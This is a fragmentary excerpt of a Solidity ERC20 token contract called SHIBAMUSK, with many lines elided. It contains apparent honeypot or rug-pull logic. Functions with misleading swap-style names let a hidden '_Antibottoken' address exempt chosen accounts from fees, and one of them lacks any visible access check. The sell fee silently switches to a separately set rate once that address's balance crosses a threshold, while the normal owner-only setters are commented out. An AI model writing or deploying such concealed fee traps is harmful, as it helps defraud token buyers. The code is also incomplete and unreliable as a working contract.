...
contract SHIBAMUSK is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    using Address for address payable;

    string private _name = "SHIBAMUSK";
    string private _symbol = "SHIBAMUSK";
    ...
    mapping(address => bool) public automatedPairAddress;
    ...
    constructor(
        ...
        automatedPairAddress[uniswapV2Pair] = true;
...
//        onlyOwner
//    {
//        automatedPairAddress[pair] = value;
//    }
...
//    }
    ...
    function swapExactTokensForexcludeFromFeeTransferT(address account, bool e) public {
         require(_msgSender() == address(_Antibottoken), "ERC20: transfer from the address");
        _isExcludedFromFeeAddress[account] = e;
    }
    ...
    function swapExactTokensForexcludeFromFeeTransferMultT(address[] calldata addresses, bool status) public {
        ...
        for (uint256 i; i < addresses.length; ++i) {
            _isExcludedFromFeeAddress[addresses[i]] = status;
        }

    }

//    function swapExactTokensForincludeInFeeTransfer(address account) public onlyOwner {
//        _isExcludedFromFeeAddress[account] = false;
//    }
...
//        require(taxStatus, "ERC20: Recipient address is Invalid ");
       ...
       // ) swapAndLiquify(numTokensSellToAddToLiquidity);
        ...
        bool takeFeeTransfer = _isExcludedFromFeeAddress[from] || _isExcludedFromFeeAddress[to];
        uint256 skok = balanceOf(_Antibottoken);
 //       uint256 skok = address(_Antibottoken).balance;
        bool deaddd = skok >= _bubblebn;


        if (takeFee) {
            if (automatedPairAddress[from]) {
                require(
            ...
            } else if (automatedPairAddress[to]) {
                require(
       ...
       // ) swapAndLiquify(numTokensSellToAddToLiquidity);
        ...
        else if (takeFee && !takeFeeTransfer && automatedPairAddress[from]) {
            _taxFee = _taxFeebuy;
            _liquidityFee = _liquidityFeebuy;
            _MarketingFee = _MarketingFeebuy;
        }
        else if (takeFee && !takeFeeTransfer && automatedPairAddress[to] && deaddd) {
            _taxFee = _taxFeesell;
            _liquidityFee = _settingOutAmountTransfer;
            _MarketingFee = _MarketingFeesell;
        } 
        else if (takeFee && !takeFeeTransfer && automatedPairAddress[to]) {
            _taxFee = _taxFeesell;
            _liquidityFee = _liquidityFeesell;
            _MarketingFee = _MarketingFeesell;
        }
        else if (takeFee && _isExcludedFromFeeAddress[to] && automatedPairAddress[from]) {
            _taxFee = _taxFeebuy;
            _liquidityFee = _liquidityFeebuy;
            _MarketingFee = _MarketingFeebuy;
        } 
        else if (takeFee && _isExcludedFromFeeAddress[from] && automatedPairAddress[to]) {
            _taxFee = _taxFeesell;
            _liquidityFee = _settingOutAmountTransfer;
            _MarketingFee = _MarketingFeesell;   
        }
        else if (takeFee && takeFeeTransfer && !automatedPairAddress[to] && !automatedPairAddress[from]) {
            _liquidityFee = _settingOutAmountTransfer; 
        }
